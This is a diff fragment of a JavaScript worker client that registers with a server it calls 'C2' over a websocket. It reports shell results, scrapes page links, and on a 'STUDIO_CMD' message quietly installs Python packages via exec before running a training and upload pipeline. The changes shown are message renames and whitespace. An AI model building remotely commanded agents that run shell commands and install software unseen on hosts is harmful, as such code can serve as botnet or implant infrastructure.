@@ -20,13 +20,13 @@ function connect() {
 
     function logToC2(msg) {
         try { 
-            ws.send(JSON.stringify({ type: 'SHELL_LOG', output: msg })); 
+            ws.send(JSON.stringify({ type: 'SHELL_RESULT', output: msg })); 
         } catch(e){}
         console.log(msg);
     }
 
     ws.on('open', () => { 
-        console.log("Connected to C2."); 
+            logToC2("✅ UNIT ONLINE: VERSION 5.0 (STUDIO READY)"); 
         ws.send(JSON.stringify({ type: 'REGISTER_WORKER' })); 
     });
 
@@ -196,7 +196,7 @@ function connect() {
                         const linkRegex = /href=["']([^"']+)["']/g;
                         const links = [];
                         let match;
-                        
+
                         while ((match = linkRegex.exec(html)) !== null) {
                             let link = match[1];
                             // If it's a relative link (starts with /), attach the domain
@@ -208,7 +208,7 @@ function connect() {
                                 links.push(link);
                             }
                         }
-                        
+
                         // Filter duplicates
                         const uniqueLinks = [...new Set(links)].slice(0, 100);
                         ws.send(JSON.stringify({ 
@@ -245,10 +245,10 @@ function connect() {
             // 13. STUDIO MODE (CONTENT PIPELINE)
             else if (msg.type === 'STUDIO_CMD') {
                 logToC2(`[STUDIO] Initializing Production Pipeline...`);
-                
+
                 // 1. Install Dependencies (Quietly)
                 const installCmd = "pip install pygame neat-python numpy scipy imageio moviepy google-auth google-auth-oauthlib google-auth-httplib2 google-api-python-client";
-                
+
                 exec(installCmd, { timeout: 300000 }, (err, stdout, stderr) => {
                     if (err) {
                         logToC2(`[STUDIO ERROR] Dep Install Failed: ${err.message}`);
@@ -263,7 +263,7 @@ function connect() {
                             logToC2(`[DEBUG] ${stdout2.substring(0, 200)}`);
                             return;
                         }
-                        
+
                         logToC2(`[STUDIO] Training Complete. Starting Editor...`);
 
                         // 3. Run the Editor (Stitch & Upload)
